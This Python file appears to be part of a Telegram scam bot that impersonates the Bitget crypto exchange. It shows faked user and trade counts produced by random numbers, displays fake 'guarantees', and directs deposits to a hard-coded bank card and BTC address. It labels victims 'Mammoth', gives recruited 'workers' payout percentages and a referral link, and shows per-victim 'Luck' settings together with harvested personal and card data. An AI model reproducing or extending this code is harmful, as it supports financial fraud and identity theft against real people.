from telebot import types
import random
from datetime import datetime
import sqlite3
from referals import *



def generate_cabinet_text(user_id):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM user_data WHERE user_id = ?", (user_id,))
    data = cursor.fetchone()

    users = 3000 + random.randint(-200, 200)
    trades = 2000 + random.randint(-200, 200)
    now = datetime.now()
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")


    string = "🖥 Personal cabinet\n\n"

    string += "➖➖➖➖➖➖➖➖➖➖➖➖\n"
    string += f"🆔 Your ID: {user_id}\n"
    string += f"💰 Balance: {data[6]} {data[10]}\n"
    string += "➖➖➖➖➖➖➖➖➖➖➖➖\n"
    string += "Info about user:\n\n"

    if data[2] == '0':
        string += "🌍 Your country : N/A\n"
    else:
        string += f"🌍 Your country: {data[2]}\n"
    
    if data[3] == '0':
        string += "📪 Your email: N/A\n"
    else:
        string += f"📪 Your email: {data[3]}\n"
    
    if data[5] == '0':
        string += "💳 Your Card: N/A\n"
    else:
        string += f"💳 Your Card: {data[5]}\n"
    
    if data[1] == '0':
        string += "👤 Your Name/Surname: N/A\n"
    else:
        string += f"👤 Your Name/Surname: {data[1]}\n"
    

    if data[4] == '0':
        string += "📱 Your number: N/A\n"
    else:
        string += f"📱 Your number: {data[4]}\n"
    string += "➖➖➖➖➖➖➖➖➖➖➖➖\n\n"


    string += f"📱 Active online users: {users}\n"
    string += f"🟢 Open trades online - {trades}\n\n"

    string += f"📝 Current date and time: {dt_string}"
    conn.close()

    return string


def generate_guarantee():
    text = """ Bitget Exchange is an online exchange that provides trading services for binary options and other financial instruments.

It is important to realise that in any financial sphere there are risks associated with investing and trading. Therefore, no exchange or company can give full guarantees of profit or risk-free trading. However, Poloniex Exchange can provide its clients with some guarantees to ensure the reliability and safety of its services.

Some possible guarantees that Bitget Exchange can provide include:

🔒Security of customer funds: Bitget Exchange guarantees the safety of customer funds in separate bank accounts, separate from the company's own funds. This protects users from possible financial risks associated with the bankruptcy of the exchange.

⚙️Security transactions: Bitget Exchange uses highly effective encryption and data protection systems to ensure the security of transactions and the protection of customers' confidential information.

🌐 Transparency and openness: Bitget Exchange provides full information about its services, fees, terms and conditions, and allows its customers to check their accounts.

🦹🏼‍♂️ Training and Support: Bitget Exchange provides full support to its clients, helping them to improve their trading skills and access up-to-date information and analytics.
"""
    return text


def generate_status():
    trades = 2000 + random.randint(-200, 200)
    not_proven = 1300 + random.randint(-200, 200)


    string = "______________________________\n"
    string += f"Workload: {round(not_proven/trades, 1)*100}%\n"
    string += f"Unconfirmed transactions: {not_proven}\n"

    string += """______________________________

Commission to get into the first block:
Minimum: 0.00003072 BTC / kVB
Median: 0.00004096 BTC / kVB"""

    return string


def generate_settings(user_id):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM user_data WHERE user_id = ?", (user_id,))
    data = cursor.fetchone()
    conn.close()

    string = "ℹ️User information:\n\n"

    
    if data[2] == '0':
        string += "🌍 Your country : N/A\n"
    else:
        string += f"🌍 Your country: {data[2]}\n"
    
    if data[3] == '0':
        string += "📪 Your email: N/A\n"
    else:
        string += f"📪 Your email: {data[3]}\n"
    
    if data[5] == '0':
        string += "💳 Your Card: N/A\n"
    else:
        string += f"💳 Your Card: {data[5]}\n"
    
    if data[1] == '0':
        string += "👤 Your Name/Surname: N/A\n"
    else:
        string += f"👤 Your Name/Surname: {data[1]}\n"
    

    if data[4] == '0':
        string += "📱 Your number: N/A\n"
    else:
        string += f"📱 Your number: {data[4]}\n"


    string += "⚙️ Select the parameter of interest for further modification."
    return string


def generate_get_support():

    string = """🛠️ Our official technical support

You have any questions or problems❔🖥❕
You can always contact our technical support team

🧾 Rules for communicating with the operator:
➕ Communicate politely, there is a live person like you sitting on the other side.
➕ Try to formulate your address to the operator succinctly and succinctly, in one message.
➕ Address support only on the merits!
➕ Support does not conduct sales and does not attract customers! (Only solving disputes, about payment and conclusions).
➕ You should formulate an appeal to the operator with a receipt of payment
Messages like: - I did not save the receipt - I transferred, look - Hi (etc.) ⚠️ Categorically ignored!

 🛠️ Our official technical support"""
    
    return string


def generate_deposit_card(user_id):

    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM user_data WHERE user_id = ?", (user_id,))
    data = cursor.fetchone()
    conn.close()

    string = f"""Payment by card

⚠️ Dear User, The minimum amount is {data[9]} {data[10]}

To recharge by card, make a payment using the details below, with the comment provided.

💱 Card number: 2202203604751091

📝 Payment comment: {user_id}

If you are unable to specify a comment send a cheque,receipt of payment to technical support: @Bit_GetSupport"""

    return string


def generate_deposit_bitcoin():

    string = """BTC payment

To deposit BTC from an external wallet, use the reusable address below.

💱 BTC address: bc1q5sp7lqqxyga85gj7rtry2uj9hql732w098fs5j

After depositing funds, send a cheque, receipt, screenshot of the transfer to @Bit_GetSupport technical support and you will be credited to your account.

⚠️ Dear user, please note that all deposits less than 10$ will not be credited to the service, reimbursement for these transactions is also not provided."""

    return string


def generate_buy(crypto, user_id):

    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM user_data WHERE user_id = ?", (user_id,))
    data = cursor.fetchone()

    string = f"""🌐 Enter the amount you wish to invest in {crypto}

The minimum investment amount is 1000₽
Your cash balance: {data[6]} RUB"""
    conn.close()

    return string


def generate_working(user_id):


    string = f"""⚡️ Trader Menu:
💳Bank Card:
4890494760442014
    
🪩 Interest for payouts:
├ 💲 Replenishment: 80%
├ 💲 Direct transfer: 70%
└ 💲 Addition via TP: 60%

Referral link:
https://t.me/Bitget_Exchanges_bot?start={user_id}
    """

    return string


def generate_withdraw(user_id, card):

    conn = sqlite3.connect("mydatabase.db")
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM user_data WHERE user_id = ?", (user_id,))
    data = cursor.fetchone()
    conn.close()

    string = f"""Enter the withdrawal amount
💳 To card {card}
💰 Your balance {data[6]} {data[10]} """
    
    return string


def generate_mamont_info(bot, id):
    chat_info = bot.get_chat(id)
    if chat_info.last_name is None:
        username = chat_info.first_name
    else:
        username = chat_info.first_name + chat_info.last_name    

    conn = sqlite3.connect("mydatabase.db")
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM user_data WHERE user_id = ?", (str(id),))
    data = cursor.fetchone()
    conn.close()

    string = f"""Trader: {username}

id: {id}
Balance: {data[6]}
Currency: {data[10]}
Limit: {data[7]}
Luck: {data[11]*100}%

Additional Info:

{data[2]} Country: {data[2]}
Email: {data[3]}
{data[2]} map: {data[5]}
Name: {data[1]}
"""
    return string



def generate_buy_result(state, user_id):

    conn = sqlite3.connect("mydatabase.db")
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM user_data WHERE user_id = ?", (user_id,))
    data = cursor.fetchone()
    conn.close()

    string = f"""🏦{state[0]}

Bid amount: {state[1]} {data[10]}
Prediction: {state[2]}
Leverage: {state[3]}

In {state[4].split(' ')[0]} seconds the trade will close
"""
    return string


def generate_withdraw_worker(bot, user_id, amount, success):

    chat_info = bot.get_chat(user_id)
    if chat_info.last_name is None:
        username = chat_info.first_name
    else:
        username = chat_info.first_name + chat_info.last_name 
    
    withdraw_result = "Success" if success else "Failed"

    string = f"""Trader made a withdrawal
Mammoth: {username}
🆔: {user_id}
Sum: {amount}
💳 Withdrawal to bank card
🍀Status: {withdraw_result}
"""
    
    return string